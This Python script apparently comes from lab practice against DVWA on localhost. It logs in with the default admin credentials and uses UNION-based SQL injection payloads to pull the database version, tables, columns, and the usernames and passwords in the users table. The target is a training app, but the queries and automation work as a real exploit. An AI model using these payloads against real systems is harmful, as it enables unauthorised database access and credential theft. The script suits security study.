import requests
from bs4 import BeautifulSoup
# Cookies for security level
security_levels = ["medium", "medium", "high", "impossible"]
# URL section
base_ip = "127.0.0.1"
login_url = f"http://{base_ip}/dvwa/login.php"
sqli_url = f"http://{base_ip}/dvwa/vulnerabilities/sqli/"# Query section
query_version = "-1 UNION SELECT 1, VERSION()#"
query_database = "-1 UNION SELECT 1,DATABASE() #"
query_tables = "-1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=0x{}; #"
query_users_cols = "-1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=0x{} #"
query_users_names = "-1 UNION SELECT {}, {} FROM users #"

def send_query(query, session):
    data = {"id": query, "Submit": "Submit"}
    response = session.post(sqli_url, data=data)
    soup = BeautifulSoup(response.text, "html.parser")
    final_result = soup.find_all("pre")
    return final_result
def login(url, security):
    s = requests.Session()
    s.cookies.set("security", security_levels[security])
    response = s.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    print('SSSSSS', soup)
    user_token = soup.find("input", {"name": "user_token"})
    print('SSSSSS', user_token)
    data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token["value"],
    }
    response = s.post(url, data=data)
    return s
def beautify_query_single(query_result):
    beautified_query_result = (str(query_result).replace("<br/>", "\n").replace("<pre>", "").replace("</pre>", ""))
    return beautified_query_result.splitlines()[2].split(":")[1].strip()
def beautify_query_double(query_result):
    beautified_query_result = (str(query_result).replace("<br/>", "\n").replace("<pre>", "").replace("</pre>", ""))
    return (
        beautified_query_result.splitlines()[1].split(":")[1]
        + " "
        + beautified_query_result.splitlines()[2].split(":")[1]
    )
if __name__ == "__main__":
	session = login(login_url, 1)
	response = session.get(sqli_url)
	soup = BeautifulSoup(response.text, "html.parser")
	print("The database version is:")
	print(beautify_query_single(send_query(query_version, session)[0]))
	print()
	print("The database name is:")
	db_name = beautify_query_single(send_query(query_database, session)[0])
	print(db_name)
	print()
	print("The tables' names are:")
	for table in send_query(query_tables.format(db_name.encode("utf-8").hex()), session):
		print(beautify_query_single(table))
	print()
	table_name = input("Type the table name you want\n")
	print("\nThe columns' names in users table are:")
	for column in send_query(query_users_cols.format(table_name.encode("utf-8").hex()), session):
	    print(beautify_query_single(column))
	print()
	username, password = input("Type username and password column values with comma separator \n").split(",", 1)
	print("The users' names and passwords in users table are:")
	for user in send_query(query_users_names.format(username.strip(), password.strip()), session):
		print(beautify_query_double(user))
